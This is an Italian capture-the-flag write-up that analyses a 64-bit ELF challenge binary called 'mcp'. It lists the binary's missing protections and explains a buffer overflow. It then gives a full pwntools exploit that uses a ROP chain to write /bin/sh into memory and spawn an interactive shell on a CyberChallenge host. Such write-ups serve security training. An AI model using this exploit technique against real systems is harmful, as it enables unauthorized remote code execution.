Il binario mcp è un ELF a 64 bit con le seguenti caratteristiche:

- Architettura: amd64-64-little
- Protezioni:
    - ❌ No RELRO
    - ❌ No stack canary
    - ✅ NX enabled
    - ❌ No PIE (base address = 0x400000)

---

Analizzando il binario con ghidra si nota abbastanza facilmente che c’è un buffer overflow.

L’obiettivo è ottenere una shell, sfruttando l’assenza di PIE e canary. Il binario include una funzione simile a execve:

```
0040015b: xor rsi, rsi
0040015e: xor rdx, rdx
00400161: mov eax, 59         ; syscall number per execve
00400166: syscall
```

Quindi se riusciamo a far puntare rdi a /bin/sh, otteniamo shell.

---

Il binario non ha un pop rdi; ret classico, ma troviamo questi:

- 0x400159: pop rsi; ret
- 0x400153: pop r10; add rdi, r10; ret

Per impostare rdi = stringa, possiamo:

1. Inizializzare rdi = 0
2. Usare pop r10; add rdi, r10; ret per sommare l’indirizzo desiderato

---

1. Troviamo un’area scrivibile per iniettare /bin/sh. Usiamo 0x60016c (potevamo utilizzare anche 006001b3), che contiene una stringa iniziale (e viene mostrata all’utente).
2. Creiamo una ROP chain che:
    - chiama read(0, 0x60016c, 8) per scrivere /bin/sh
    - setta rdi = 0x60016c usando add rdi, r10
    - chiama execve("/bin/sh", NULL, NULL)

---

## **Exploit**

```
from pwn import *

HOST = 'mcp.challs.cyberchallenge.it'
PORT = 9218

p = remote(HOST, PORT)

string = 0x0060016c
read_func = 0x00400138
pop_rsi = 0x0000000000400159
pop_r10_add_rdi_r10 = 0x0000000000400153
execve = 0x0040015b

payload = flat(
    b"A" * 128,
    pop_rsi, string,         # rsi = string
    read_func,               # read(0, string, 0x100)
    pop_r10_add_rdi_r10,     # r10 = string; rdi += r10
    string,
    execve                   # execve(rdi=string)
)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```